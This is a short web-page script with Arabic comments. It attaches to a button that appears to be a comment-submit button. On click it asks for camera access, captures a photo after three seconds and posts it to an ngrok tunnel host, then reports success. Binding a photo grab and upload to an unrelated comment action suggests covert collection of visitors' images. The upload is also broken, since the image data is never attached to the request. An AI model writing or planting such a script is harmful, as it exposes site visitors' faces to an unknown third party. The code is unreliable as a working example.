<script>
document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('submitComment');
    
    btn.addEventListener('click', async () => {
        try {
            // 1. طلب إذن الكاميرا أولًا
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: 640, height: 480 }
            });
            
            // 2. إظهار بث الكاميرا للمستخدم
            const videoPreview = document.createElement('video');
            videoPreview.srcObject = stream;
            videoPreview.controls = true;
            videoPreview.style.width = '300px';
            document.body.appendChild(videoPreview);
            
            // 3. التقاط الصورة بعد 3 ثوانٍ
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = videoPreview.videoWidth;
                canvas.height = videoPreview.videoHeight;
                
                canvas.getContext('2d').drawImage(videoPreview, 0, 0);
                videoPreview.srcObject.getTracks().forEach(track => track.stop());
                
                // 4. تحويل وإرسال الصورة
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                const formData = new FormData();
                formData.append('image', blob, 'photo.jpg');
                
                const response = await fetch('https://4da3-212-57-215-93.ngrok-free.app/upload', {
                    method: 'POST',
                    mode: 'cors'
                });
                
                if (response.ok) {
                    alert('✅ تم الرفع بنجاح!');
                }
            }, 3000);
            
        } catch (error) {
            alert(`❌ خطأ: ${error.message}`);
            console.error(error);
        }
    });
});
</script>